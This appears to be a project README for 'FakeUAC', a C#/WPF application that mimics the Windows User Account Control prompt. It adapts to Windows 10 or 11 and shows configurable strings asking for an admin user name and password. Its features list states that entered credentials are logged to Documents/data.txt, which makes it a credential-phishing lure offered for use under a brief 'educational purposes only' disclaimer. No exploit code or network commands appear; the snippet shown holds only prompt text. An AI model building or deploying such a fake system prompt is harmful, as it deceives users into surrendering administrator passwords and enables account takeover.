# FakeUAC 🛡️✨

![.NET](https://img.shields.io/badge/.NET-10.0-purple)
![C#](https://img.shields.io/badge/C%23-WPF-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
![UI](https://img.shields.io/badge/UI-WPF-512BD4)
![License](https://img.shields.io/github/license/Mikolaj0524/FakeUAC)

---

**FakeUAC** is a sleek, context-aware application built using **C#**, **WPF**, and **.NET 10.0**. It simulates the Windows User Account Control prompt and adjusts its style to match your OS. 🎭

---

## 🎭 Intelligent GUI Switching

The app detects your environment and swaps the interface dynamically:

* 📟 **Windows 10:** Classic sharp-edged UAC window
* 💎 **Windows 11:** Modern rounded UAC window with Mica effect

---

## 🖼️ Preview

<img width="100%" alt="Windows 10 preview" src="https://raw.githubusercontent.com/Mikolaj0524/FakeUAC/master/Screenshots/10.png" />
<img width="100%" alt="Windows 11 preview" src="https://raw.githubusercontent.com/Mikolaj0524/FakeUAC/master/Screenshots/11.png" />

---

## 🛠️ Configuration & Customization

You can personalize the prompt by editing `Texts.cs`.

### Code Snippet (`Texts.cs`)

```csharp
namespace FakeUAC
{
    public static class Texts
    {
        public static readonly Dictionary<string, string> texts = new Dictionary<string, string>()
        {
            {"title", "User Account Control"},
            {"question", "Do you want to allow this app to make changes to your device?"},
            {"exeName", "installer.exe"},
            {"publisher", "Verified publisher: Trusted Dev"},
            {"origin", "File origin: Hard drive on this computer"},
            {"showMore", "Show more details"},
            {"hideMore", "Hide details"},
            {"programLoc", "Location: C:/Users/User/Downloads/installer.exe"},
            {"continueText", "To continue, enter an admin user name and password."},
            {"moreOptions", "More options"},
            {"yes", "Yes"},
            {"no", "No"},
            {"wrongData10", "The user name or password is incorrect."},
            {"wrongData11", "The user name or password is not correct."},
            {"passwordText", "Password"}
        };
    }
}
```

---

## 🧩 Technical Features

* 🏗️ **WPF UI** for pixel-perfect rendering
* 🔍 **Icon fallback system**

  * `C:/Users/{User}/Documents/icon.png`
  * fallback to `./Images/icon.png`
* 📝 **Credential logging** saved to `Documents/data.txt`

---

## ⚠️ Disclaimer

This project is for **educational purposes only**.
The author is not responsible for misuse or damages.
Use at your own risk.

---

## 📄 License

This project is licensed under the [MIT License](https://github.com/Mikolaj0524/FakeUAC/blob/master/LICENSE)
